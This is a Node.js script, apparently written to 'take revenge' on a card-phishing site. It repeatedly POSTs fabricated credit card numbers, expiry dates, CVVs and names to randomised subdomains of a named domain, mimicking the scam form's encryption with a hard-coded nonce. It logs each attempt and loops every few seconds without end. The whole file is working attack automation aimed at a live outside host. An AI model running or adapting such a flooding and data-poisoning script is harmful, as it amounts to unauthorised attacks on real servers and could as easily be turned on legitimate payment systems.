const Encryption = require('./encrypt')
const fetch = require('node-fetch')
var fs = require('fs')
const { uniqueNamesGenerator, Config, names } = require('unique-names-generator');

const config = {
    dictionaries: [names, names],
    separator: ' ',
    length: 2
}

function logRevenge(domain, state, data) {
    fs.appendFile('scam.log',
        new Date().toISOString()
        + ' - ' +
        state + ' at ' + domain
        + ' - ' +
        data.nm + ' / ' + data.serial + ' / ' + data.date + ' / ' + data.cv + '\n'
        , function (err) {
            if (err) {
                // append failed
            } else {
                console.log('Logged scam revenge')
            }
        })
}

const DOMAIN = 'tauzaki.com';

function generateDomain() {
    var text = "http://";

    var charset = "0123456789abcdef";

    for (var i = 0; i < 8; i++)
        text += charset.charAt(Math.floor(Math.random() * charset.length));

    return text + '.' + DOMAIN;
}

function randomNumber(length) {
    var text = "";

    var charset = "0123456789";

    for (var i = 0; i < length; i++)
        text += charset.charAt(Math.floor(Math.random() * charset.length));

    return text;
}

function getRandomDate() {
    const month = Math.floor(Math.random() * 12) + 1
    const year = Math.floor(Math.random() * 4) + 24
    return (month < 10 ? '0' + month : month) + '' + year
}

function attack() {
    var nonceValue = 'e2cfa1b34d9ce5c808c301f3b5350de1';
    /*var iptS = $('#so1');    // card number  e.target.value = e.target.value.replace(/[^\dA-Z]/g, '').replace(/(.{4})/g, '$1 ').trim();     
    var iptSec = $('#secu');
    var iptExp = $('#exp');
    //  ele.value.split('/').join('');    // Remove slash (/) if mistakenly entered.
    var ownerName = $('#owner');
    var btnOrder = $('#order-now');*/

    const domain = generateDomain()

    console.log('Using domain ' + domain)

    let encryption = new Encryption();
    var frmD = {
        serial: ((51 + Math.floor(Math.random() * 5)) + randomNumber(14).replace(/[^\dA-Z]/g, '')).replace(/(.{4})/g, '$1 ').trim(),
        date: getRandomDate(),
        cv: randomNumber(3),
        nm: uniqueNamesGenerator(config)
    }
    var ctnt = JSON.stringify(frmD);

    var encrypted = encryption.encrypt(ctnt, nonceValue);

    console.log('POSTing data: ' + JSON.stringify(frmD, null, 2))

    fetch(domain + '/xhr.php', {
        method: 'POST',
        headers: {
            'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
        },
        body: JSON.stringify({
            o: '35c547698da79',
            tkn: encrypted
        })
    }).then(r => r.json().then(r => {
        console.log('Successful first respsonse')
        if (r.status) {
            fetch(domain + '/processOrder.php').then((res) => {
                console.log('Successfully registered credit card!')
                logRevenge(domain, 'SUCCESS', frmD)
                /*fetch(domain + '/collecte.php', {
                    method: 'POST',
                    headers: {
                        'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
                    },
                    body: JSON.stringify({
                        t: Date.now(),
                        ord: "35c547698da79"
                    })
                }).then(rrep => rrep.json().then(resp => {
                    console.log(resp)
                    console.log('Full success!')
                }))*/
            })
            // {"status":false,"args":{"dmn":".\/unporcessable.php"}}
            //$('#orderFrm').attr('action', function () { return encodeURI(r.args.dmn) });
            //$('#orderFrm').submit(); // only redicects to process order
        }
    })).catch((error) => {
        console.log(error)
        logRevenge(domain, 'FAIL', frmD)
    }).finally(() => {
        setTimeout(attack, 5000 + Math.floor(Math.random() * 5000));
    })

}

attack()